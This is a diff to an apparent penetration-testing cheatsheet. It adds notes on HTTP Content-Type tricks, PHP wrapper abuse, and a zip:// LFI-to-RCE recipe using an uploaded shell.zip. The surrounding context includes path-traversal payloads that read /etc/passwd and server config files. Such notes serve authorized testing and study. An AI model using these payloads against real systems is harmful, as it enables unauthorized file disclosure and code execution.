@@ -105,6 +105,16 @@ $ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common
 ````  
 
 ### ============================================================
+### GENERAL HTTP TRICKERY
+### ============================================================
+
+Changing Content-Type:
+* `Content-Type: image/png` =>  `Content-Type: text/html`
+
+HTTP Header Injection:
+
+
+### ============================================================
 ### Authentication and Session Management
 ### ============================================================
 
@@ -120,6 +130,9 @@ Observe:
 
 A more in-depth LFI / LFI->RCE Cheatsheet:  
 * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
+How to abuse PHP wrappers (ftp:// zip:// etc.) (RCE exploit)
+* https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
+* Write malicious PHP -> create .zip containing malicious PHP -> https://target.com/param?=zip://shell.zip -> RCE
 
 STEP #1: Verify existence of LFI/LFD vulnerability.
 ```
@@ -202,6 +215,10 @@ C:/windows/system32/drivers/etc/hosts
 
 Other things to try:
 ```
+TRY OTHER PROTOCOLS:
+http://, ftp:// etc.
+
+TRY OTHER LFI METHODS:
 ./index.php | ././index.php | .//index.php
 ../../../../../../etc/passwd | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 /etc/nginx/conf.d/default.conf
